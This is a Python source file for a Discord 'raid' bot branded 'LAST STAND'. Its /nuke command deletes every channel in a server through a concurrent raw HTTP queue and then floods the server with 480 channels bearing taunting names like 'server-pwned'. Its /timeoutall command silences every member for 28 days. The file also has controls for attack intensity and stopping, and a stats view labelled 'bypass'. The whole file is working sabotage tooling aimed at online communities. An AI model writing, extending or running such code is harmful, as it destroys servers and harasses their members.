"""
control.py — LAST STAND | /stop, /status, /nuke, /timeoutall, /setratelimit, /bypassstats
Nuke uses 100-thread raw HTTP queue for channel delete + rebuild (c-realV2.py port).
"""

import asyncio
import datetime
import random

import discord
import requests
from discord import app_commands
from discord.ext import commands

from utils.http_queue import HttpQueue, API_BASE
from utils.state import bot_state

RAID_TAG = "LAST STAND"

_CH_NAMES = [
    "raided-by-ls", "last-stand-owned", "ls-raid", "jean-lorenzo-raided",
    "ls-was-here", "obliterated-by-ls", "ls-breach", "server-pwned",
]


class Control(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /stop + .stop ──────────────────────────────────────────────────────────
    @app_commands.command(name="stop", description="Immediately stop all running operations.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def stop(self, interaction: discord.Interaction) -> None:
        await interaction.response.send_message(self._do_stop())

    @commands.command(name="stop")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def stop_prefix(self, ctx: commands.Context) -> None:
        await ctx.send(self._do_stop())

    def _do_stop(self) -> str:
        if not bot_state.active_simulation and not bot_state.is_running():
            return "No operation is currently running."
        name  = bot_state.active_simulation or "unknown"
        count = len(bot_state.running_tasks)
        HttpQueue.get().clear()
        bot_state.stop_all()
        return (
            f"🛑 **Stopped — {RAID_TAG}**\n"
            f"┣ Operation : `{name}`\n"
            f"┗ Cancelled : `{count}` tasks"
        )

    # ── /status + .status ──────────────────────────────────────────────────────
    @app_commands.command(name="status", description="Show current operation status.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def status(self, interaction: discord.Interaction) -> None:
        await interaction.response.send_message(self._do_status(), ephemeral=True)

    @commands.command(name="status")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def status_prefix(self, ctx: commands.Context) -> None:
        await ctx.send(self._do_status())

    def _do_status(self) -> str:
        if bot_state.active_simulation:
            return (
                f"📊 **Running: `{bot_state.active_simulation}`** — {RAID_TAG}\n"
                f"┗ Active tasks: `{len(bot_state.running_tasks)}`"
            )
        return f"📊 **Idle** — {RAID_TAG}\n┗ Active tasks: `{len(bot_state.running_tasks)}`"

    # ── /setratelimit + .setratelimit ──────────────────────────────────────────
    @app_commands.command(name="setratelimit", description="Change intensity live (1–10).")
    @app_commands.describe(level="1–10")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def setratelimit(self, interaction: discord.Interaction, level: int) -> None:
        await interaction.response.send_message(self._do_setratelimit(level), ephemeral=True)

    @commands.command(name="setratelimit", aliases=["setrl"])
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def setratelimit_prefix(self, ctx: commands.Context, level: int = 10) -> None:
        await ctx.send(self._do_setratelimit(level))

    def _do_setratelimit(self, level: int) -> str:
        if not 1 <= level <= 10:
            return "❌ Level must be 1–10."
        bot_state.rate_controller.set_intensity(level)
        return f"⚙️ Intensity set to `{level}/10`."

    # ── /bypassstats + .bypassstats ────────────────────────────────────────────
    @app_commands.command(name="bypassstats", description="Show task and operation stats.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def bypassstats(self, interaction: discord.Interaction) -> None:
        await interaction.response.send_message(self._do_stats(), ephemeral=True)

    @commands.command(name="bypassstats", aliases=["bpstats"])
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def bypassstats_prefix(self, ctx: commands.Context) -> None:
        await ctx.send(self._do_stats())

    def _do_stats(self) -> str:
        return (
            f"📊 **Stats — {RAID_TAG}**\n"
            f"```\n"
            f"Operation    : {bot_state.active_simulation or 'idle'}\n"
            f"Active tasks : {len(bot_state.running_tasks)}\n"
            f"Engine       : 100-thread raw HTTP queue\n"
            f"```"
        )

    # ── /nuke + .nuke ──────────────────────────────────────────────────────────
    @app_commands.command(name="nuke", description="☢️ Delete every channel instantly via 100-thread queue, optionally rebuild.")
    @app_commands.describe(rebuild="Create 100 flood channels after nuking. Default True.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def nuke(self, interaction: discord.Interaction, rebuild: bool = True) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** running — use `/stop` first.", ephemeral=True
            )
            return
        guild    = interaction.guild
        channels = list(guild.channels)
        self._start_nuke(guild, channels, rebuild)
        await interaction.response.send_message(
            f"☢️ **NUKE — {RAID_TAG}**\n"
            f"┣ Deleting : `{len(channels)}` channels\n"
            f"┣ Engine   : `100-thread raw HTTP queue`\n"
            f"┗ Rebuild  : `{'✅ 480 flood channels' if rebuild else '❌'}`"
        )

    @commands.command(name="nuke")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def nuke_prefix(self, ctx: commands.Context, rebuild: str = "true") -> None:
        if bot_state.active_simulation:
            await ctx.send(f"⚠️ **{bot_state.active_simulation}** running — use `.stop` first.")
            return
        guild      = ctx.guild
        channels   = list(guild.channels)
        do_rebuild = rebuild.lower() not in ("false", "no", "0")
        self._start_nuke(guild, channels, do_rebuild)
        await ctx.send(
            f"☢️ **NUKE — {RAID_TAG}**\n"
            f"┣ Deleting : `{len(channels)}` channels\n"
            f"┣ Engine   : `100-thread raw HTTP queue`\n"
            f"┗ Rebuild  : `{'✅ 480 flood channels' if do_rebuild else '❌'}`"
        )

    def _start_nuke(self, guild: discord.Guild, channels: list, rebuild: bool) -> None:
        bot_state.reset()
        bot_state.active_simulation = "nuke"
        bot_state.add_task(asyncio.create_task(self._run_nuke(guild, channels, rebuild)))

    async def _run_nuke(self, guild: discord.Guild, channels: list, rebuild: bool) -> None:
        se = bot_state.stop_event
        q  = HttpQueue.get()

        try:
            # ── delete all channels simultaneously via queue ───────────────
            for ch in channels:
                q.put(requests.delete, f"{API_BASE}/channels/{ch.id}")
            await q.join()

            if rebuild and not se.is_set():
                await asyncio.sleep(1.5)

                # ── rebuild 480 flood channels via queue ───────────────────
                for i in range(480):
                    if se.is_set():
                        break
                    name = f"{random.choice(_CH_NAMES)}-{i:03d}"
                    q.put(
                        requests.post,
                        f"{API_BASE}/guilds/{guild.id}/channels",
                        {"name": name, "type": 0},
                    )

                if not se.is_set():
                    await q.join()

        except asyncio.CancelledError:
            q.clear()
        except Exception as e:
            print(f"[nuke] crashed: {e}", flush=True)
        finally:
            if bot_state.active_simulation == "nuke":
                bot_state.active_simulation = None

    # ── /timeoutall + .timeoutall ──────────────────────────────────────────────
    @app_commands.command(name="timeoutall", description="⏱️ Timeout every member for 28 days.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def timeoutall(self, interaction: discord.Interaction) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** running — use `/stop` first.", ephemeral=True
            )
            return
        await interaction.response.defer()
        await self._run_timeoutall(interaction.guild, interaction.user.id, interaction.followup.send)

    @commands.command(name="timeoutall", aliases=["toa"])
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def timeoutall_prefix(self, ctx: commands.Context) -> None:
        if bot_state.active_simulation:
            await ctx.send(f"⚠️ **{bot_state.active_simulation}** running — use `.stop` first.")
            return
        await self._run_timeoutall(ctx.guild, ctx.author.id, ctx.send)

    async def _run_timeoutall(self, guild: discord.Guild, invoker_id: int, reply) -> None:
        try:
            await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
        except Exception:
            pass

        me = guild.me
        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != invoker_id
            and m.id != me.id
            and m.top_role < me.top_role
        ]

        if not targets:
            await reply("No eligible members found.")
            return

        bot_state.reset()
        bot_state.active_simulation = "timeoutall"

        await reply(
            f"⏱️ **MASS TIMEOUT — {RAID_TAG}**\n"
            f"┣ Targets  : `{len(targets)}`\n"
            f"┣ Duration : `28 days`\n"
            f"┣ Engine   : `100-thread raw HTTP queue`\n"
            f"┗ `/stop` or `.stop` halts immediately."
        )

        bot_state.add_task(asyncio.create_task(self._do_timeout(guild, targets)))

    async def _do_timeout(self, guild: discord.Guild, members: list[discord.Member]) -> None:
        q  = HttpQueue.get()
        se = bot_state.stop_event

        timeout_until = (
            datetime.datetime.utcnow() + datetime.timedelta(days=28)
        ).strftime("%Y-%m-%dT%H:%M:%S.000Z")

        try:
            for m in members:
                if se.is_set():
                    break
                q.put(
                    requests.patch,
                    f"{API_BASE}/guilds/{guild.id}/members/{m.id}",
                    {"communication_disabled_until": timeout_until},
                )
            if not se.is_set():
                await q.join()
        except asyncio.CancelledError:
            q.clear()
        finally:
            if bot_state.active_simulation == "timeoutall":
                bot_state.active_simulation = None

    # ── error handlers ─────────────────────────────────────────────────────────
    @stop.error
    @status.error
    @setratelimit.error
    @bypassstats.error
    @nuke.error
    @timeoutall.error
    async def _cmd_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = (
            "❌ You need **Administrator** permission."
            if isinstance(error, app_commands.MissingPermissions)
            else f"❌ {error}"
        )
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Control(bot))
